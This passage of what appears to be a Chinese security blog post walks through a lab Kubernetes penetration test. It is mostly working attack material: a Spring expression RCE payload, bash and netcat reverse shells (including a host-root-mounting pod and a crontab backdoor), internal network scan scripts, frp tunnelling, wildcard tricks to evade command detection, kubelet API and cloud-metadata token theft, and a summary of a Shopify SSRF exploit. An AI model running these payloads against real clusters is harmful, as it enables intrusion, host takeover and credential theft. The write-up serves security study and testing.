kind: Service
metadata:
  name: rce-deployment
  labels: 
   name: rce-deployment
spec:
  type: NodePort
  ports:
    - port: 8080
      nodePort: 30001
  selector:
    app: vul-rce


```

在 master 主机分别执行:

```
kubectl create -f RCE-vul.yaml
kubectl create -f vul-sr.yaml


```

创建完成后，执行 `kubectl get services` 可以看到成功映射端口

![](https://blog.riskivy.com/wp-content/uploads/2019/02/25.png)

接着回到 node 节点主机，关闭防火墙。仍然存在外部无法访问应用的情况，执行命令 `iptables -P FORWARD ACCEPT`

![](https://blog.riskivy.com/wp-content/uploads/2019/02/26.png)

### 2\. 漏洞利用获取权限

利用漏洞，实现反弹 shell。执行如下 payload:

```
curl -v -d 'username\[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("cp /etc/passwd /tmp")\]=test' 'http://localhost:8080/users/'


```

反弹 shell 的过程中，payload 存在特殊字符，无法执行。编写反弹 shell 的脚本, 代码如下：

```
#!/bin/bash

bash -i >& /dev/tcp/ip/port 0>&1


```

下载脚本文件至目标主机，测试过程中，发现目标测试环境无法解析域名。这个问题需修改 `kubelet` 配置文件中 `KUBELET_DNS_IP`为公网 DNS `8.8.8.8`。但本次测试决定使用域名无法解析的环境。  
在服务器上执行 `python -m SimpleHTTPServer 10888` 通过 python 临时开启 http 服务下载文件

![](https://blog.riskivy.com/wp-content/uploads/2019/02/27.png)

接着执行该文件，获取 shell

![](https://blog.riskivy.com/wp-content/uploads/2019/02/28.png)

![](https://blog.riskivy.com/wp-content/uploads/2019/02/29.png)

### 3\. 攻击集群组件

输入指令 env，获取到当前容器信息。只有 Deployment 的 IP，没有 node 节点的信息

![](https://blog.riskivy.com/wp-content/uploads/2019/02/30.png)

集群的组件中可利用的默认端口如下：

*   8080/6443 kube-apiserver
*   10250/10255/4149 kubelet
*   2379 etcd
*   30000 dashboard
*   2375 docker api
*   10256 kube-proxy
*   9099 calico-felix

局域网地址范围分三类，以下 IP 段为内网 IP 段：

*   C 类：192.168.0.0 – 192.168.255.255
*   B 类：172.16.0.0 – 172.31.255.255
*   A 类：10.0.0.0 – 10.255.255.255

编写简单的多线程 linux shell 脚本对比 nmap 的扫描速率，代码如下：

```
#!/bin/bash
NETWORK=$1
for a in $(seq 1 255)
do
    for b in $(seq 1 255)
    do
     {
       ping -c 1 -w 1 $NETWORK.$a.$b &>/dev/null && result=0 || result=1
        if \[ "$result" == 0 \];then
            echo -e "\\033\[32;1m$NETWORK.$a.$b is up! \\033\[0m"
            echo "$NETWORK.$a.$b" >> AllHosts\_up.txt
        else
            echo -e "\\033\[;31m$NETWORK.$a.$b is down!\\033\[0m"
        fi
      } &
    done
done


```

对 A 类地址的 C 段进行扫描对比，结果如下：

执行脚本 time sh shell.sh 10.0 , 耗费了 13min41s

![](https://blog.riskivy.com/wp-content/uploads/2019/02/61.png)

使用 nmap 对存活主机探测，调整并行扫描组及探测报文并行度为最小，通过 ICMP echo 判定主机是否存活。执行命令及结果如下：  
`nmap 10.0.0.1/16 -sn -PE --min-hostgroup 1024 --min-parallelism 1024 -oG ip_scan.txt`

![](https://blog.riskivy.com/wp-content/uploads/2019/02/62.png)

对比结果，nmap 可以更快的实现对存活主机的探测。

为了获取宿主机权限，攻击流程如下：

1.  由于目标主机无法解析域名，遇到使用 nmap 需要 apt-get 安装 gcc ,python 缺少模块无法安装等问题。通过 `curl -O https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap` 下载编译好的 nmap 工具。

– 先对 A 类地址进行探测，执行命令 `./nmap 10.0.0.1/16 -sn PE --min-rate 1000 -oG ip_scan.txt`  
– 对 B 类地址进行探测 `./nmap 172.0.0.0/16 172.16.0.0/12 -sn -PE --min-rate 1000 -oG ip_scan.txt`  
– 对输出结果中的 ip 进行过滤，执行命令 `cat ip_scan.txt |grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'`

2.  编译好的 nmap 工具，对文本中的 IP 进行扫描会报错，因为缺失文件。编写简单的 shell 脚本调用 curl 对端口探测，探测端口为集群组件的默认端口，代码如下：

```
#!/bin/bash

for i in $(cat AllHosts\_up.txt)
do
        for j in 8080 10250 10255 6643 2379 30000 2375
           do
                curl $i:$j &>/dev/null
                    if \[ $? -eq 0 \]; then
                           echo "$i 开放了 $j 端口"
                           echo "$i:$j" >> portScan.txt
                   else
                           echo "$i 未开放 $j 端口"
                   fi
           done
done


```

简单测试结果如下：

![](https://blog.riskivy.com/wp-content/uploads/2019/02/63.png)

3.  在对 A 类网段探测过程中，发现有多个主机存在集群组件的默认端口。内网中开放了 K8S API 服务, 且可以未授权访问。下载 kubectl，对 K8S API 进行操作。访问 `https://dl.k8s.io/v1.9.3/kubernetes-client-linux-amd64.tar.gz` 下载文件至于服务器上，使用 python 开放 http 服务提供下载。执行如下命令：
    
    wget http://x.x.x.x/kubernetes-client-linux-amd64.tar.gz  
    tar -zxvf kubernetes-client-linux-amd64.tar.gz  
    cd kubernetes/client/bin  
    chmod +x ./kubectl  
    mv ./kubectl /usr/local/bin/kubectl
    

运行 kubectl version，返回版本信息，说明安装成功

![](https://blog.riskivy.com/wp-content/uploads/2019/02/55.png)

4.  通过 kubectl 创建 pod 并挂载根目录, 执行反弹 shell 命令。yaml 文件内容如下：
    
    apiVersion: v1  
    kind: Pod  
    metadata:  
    name: test  
    spec:  
    containers:
    
    *   name: busybox  
        image: busybox:1.29.2  
        command: \[“/bin/sh”\]  
        args: \[“-c”, “nc ip port -e /bin/sh”\]  
        volumeMounts:
        *   name: host  
            mountPath: /mnt  
            volumes:
    *   name: host  
        hostPath:  
        path: /  
        type: Directory

服务端开启监听，执行命令 `kubectl -s http://10.0.xxx.xxx:8080/ create -f vul.yaml` 。进入 / mnt 目录，可以看到获取了宿主机权限。但由于根目录位于 / mnt 下，与当前环境变量冲突，部分工具无法使用。

![](https://blog.riskivy.com/wp-content/uploads/2019/02/57.png)

5.  向容器的 /mnt/etc/crontab 写入反弹 shell 的定时任务，因为创建容器时把宿主机的根目录挂载到了容器的 / mnt 目录下，所以可以直接影响到宿主机的 crontab。
    
    echo -e “\* \* \* \* \* root bash -i>& /dev/tcp/ip/port 0>&1\\n” >> /mnt/etc/crontab
    

在服务端开启端口监听，等待一段时候后获取 shell，shell 的主机名为宿主机

![](https://blog.riskivy.com/wp-content/uploads/2019/02/58-1.png)

### 4\. 渗透分析

#### 4.1 内网穿透代理服务搭建

渗透过程里，根据具体环境需求，可以搭建内网穿透代理服务来进行后渗透阶段。

frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。

下载地址：

https://github.com/fatedier/frp/releases

在公网服务器上修改 frps.ini 文件，默认端口 7000，可更改绑定端口。通过`./frps -c ./frps.ini` 启动，在公网监听 7000。

![](https://blog.riskivy.com/wp-content/uploads/2019/02/31.png)

在内网主机上，增加配置如下：

```
\[common\]
server\_addr = 公网IP
server\_port = 7000

\[plugin\_http\_proxy\]
type = tcp
remote\_port = 6004
plugin = http\_proxy

plugin\_http\_user = abcd
plugin\_http\_passwd = abcd


```

通过 `./frpc -c ./frpc.ini`启动客户端

![](https://blog.riskivy.com/wp-content/uploads/2019/02/32.png)

在浏览器中，使用 SwitchyOmega 配置公网 IP 及代理端口 6004，输入账号和密码。使用代理实现对内网服务器主机的访问, 前提是不和客户端在同一出口 IP 下

![](https://blog.riskivy.com/wp-content/uploads/2019/02/38.png)

#### 4.2 内网命令执行绕过

由于命令特征明显，容易被具有强特征检测的设备发现。可采用通配符的方式进行绕过，在 windows 中的案例如下：

```
C:\\>powershell C:\\??\*?\\\*3?\\c?lc.?x? calc
C:\\>powershell C:\\\*\\\*2\\n??e\*d.\* notepad
C:\\>powershell C:\\\*\\\*2\\t?s\*r.\* taskmgr


```

![](https://blog.riskivy.com/wp-content/uploads/2019/02/34.png)

linux 环境下命令执行，绕过方式如下：

```
/bin/cat /etc/passwd
/b'i'n/c'a't /e't'c/p'a's's'w'd'
/???/?at /???/????w?
/??'?'/?at /???/????w?


```

![](https://blog.riskivy.com/wp-content/uploads/2019/02/35.png)

通过 NetCat 命令执行反弹 shell

```
nc -e /bin/bash 127.0.0.1 1337
/???/?c.??????????? -e /???/b??h 2130706433 1337


```

![](https://blog.riskivy.com/wp-content/uploads/2019/02/37.png)

更多命令的绕过方式可参考如下文章`https://medium.com/secjuice/waf-evasion-techniques-718026d693d8`

#### 4.3 集群认证的获取和利用

在探测过程中发现未授权访问访问的 Kublet API, 通过 `curl -s https://k8-node:10250/runningpods/` 获取到 pod 信息。

##### 4.3.1 通过 env 获取信息

接着根据这些信息，检查 `env` 并查看 kublet 令牌是否在环境变量中。取决于云提供商或托管服务提供商，否则我们需要从以下位置检索它们：

*   挂载目录
*   云元数据网址

使用以下命令检查 env：

```
curl -k -XPOST "https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq" -d "cmd=env"


```

查看返回内容中的 KUBLET\_CERT，KUBLET\_KEY 和 CA\_CERT 环境变量

![](https://blog.riskivy.com/wp-content/uploads/2019/02/39.png)

在获取到认证信息后，需要在 `env` 中找到 kubernetes API server。并非开放了 10250 端口的主机

```
KUBERNETES\_PORT=tcp://x.x.x.x:443
or
KUBERNETES\_MASTER\_NAME: x.x.x.x:443


```

下载 kubectl 后，利用获取到的密钥和证书对 kubernetes API server 进行访问

```
kubectl --server=https://1.2.3.4 --certificate-authority=ca.crt --client-key=kublet.key --client-certificate=kublet.crt get pods --all-namespaces


```

##### 4.3.2 通过 mount 获取信息

如果在环境变量中并未发现认证信息，再次查看是否存在挂载目录

`curl -k -XPOST "https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq" -d "cmd=mount"`

```
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
/dev/sda1 on /dev/termination-log type ext4 (rw,relatime,commit=30,data=ordered)
/dev/sda1 on /etc/k8s/dns/dnsmasq-nanny type ext4 (rw,relatime,commit=30,data=ordered)
tmpfs on /var/run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,nosuid,nodev,relatime,commit=30,data=ordered)
/dev/sda1 on /etc/hostname type ext4 (rw,nosuid,nodev,relatime,commit=30,data=ordered)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,commit=30,data=ordered)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)


```

如上红色标记部分显示，可以看到 serviceaccount 的挂载目录，接着执行

```
curl -k -XPOST "https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq" -d "cmd=ls -la /var/run/secrets/kubernetes.io/serviceaccount"


```

获得输入如下：

```
total 4
drwxrwxrwt3 root root   140  Nov  9 16:27 .
drwxr-xr-x3 root root   4.0K Nov  9 16:27 ..
lrwxrwxrwx1 root root   13   Nov  9 16:27 ca.crt -> ..data/ca.crt
lrwxrwxrwx1 root root   16   Nov  9 16:27 namespace -> ..data/namespace
lrwxrwxrwx1 root root   12   Nov  9 16:27 token -> ..data/token


```

查看 token:

```
curl -k -XPOST "https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"


```

结果如下：

```
eyJhbGciOiJSUzI1NiI---SNIP---


```

在安装好 kubectl 后，利用获取的证书 `ca.crt` 和 `token`，对 kubernetes API server 进行访问

```
kubectl --server=https://1.2.3.4 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiI---SNIP--- get pods --all-namespaces


```

根据返回的 pods 信息，指定 pod 获取执行 shell 的权限

```
kubectl exec -it metrics-server-v0.2.1-7f8ee58c8f-ab13f --namespace=kube-system--server=https://1.2.3.4  --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiI---SNIP--- /bin/sh


```

#### 4.4 GKE 的认证获取

GKE 和 AWS 之类的云平台会在本地提供元数据服务供开发者获得自己私有仓库的认证信息，如在 GKE 的机器上执行

```
curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token


```

国外 hackerone 漏洞赏金平台公开了一份关于 Shopify 的漏洞报告，通过利用 Shopify Exchange 的屏幕截图功能中的服务器端请求伪造错误，获取对集群中任意容器的 root 访问权限。  
漏洞利用的关键过程如下：

**访问 Google Cloud Metadata**

1.  创建商店（partners.shopify.com）
2.  编辑模板 password.liquid 并添加以下内容：
    
    ```
    <script>
        http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
    </script>
    
    
    ```
    
3.  转到`https://exchange.shopify.com/create-a-listing` 并安装 Exchange 应用程序
4.  等待商店屏幕截图显示在 “创建列表” 页面上
5.  下载 PNG 并使用图像编辑软件打开它或将其转换为 JPEG

由于元数据隐藏未启动，造成 `kube-env`属性可以被调用。返回了 Kubelet 的证书及密钥，调用 kubectl 可以实现对 pod 的查询

```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces

NAMESPACE   NAME      READY STATUS RESTARTS   AGE
██████████  ████████    1/1


```

但是无法对指定 pod 进行操作，获取返回的 shell。通过 kubectl 对指定 pod 执行 describe 和 get secret 找到 token 所在位置。使用 token 及证书实现对指定 pod 的命令执行

```
$ kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash

Defaulting container name to web.
Use 'kubectl describe pod/w█████████' to see all of the containers in this pod.
███████:/# id
uid=0(root) gid=0(root) groups=0(root)
█████:/# ls
app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
bin  build  etc  home  lib  media  opt  root  sbin  ssl  sysusr
███████:/# exit


```

详细利用过程可参考报告 `https://hackerone.com/reports/341876`

**六、总结**
--------

在 DevOps、微服务等云原生应用的开发过程中，kubernetes 技术提供了极大的便利，经过近几年的发展，显示了强大的优势。近年来，由于容器以及容器应用环境引发的安全风险与安全事件不断的被曝出，集群组件、容器镜像、暴露的 API、容器的隔离等问题成为了容器使用时需要着重考虑的问题。

作者：斗象能力中心 TCC – Halo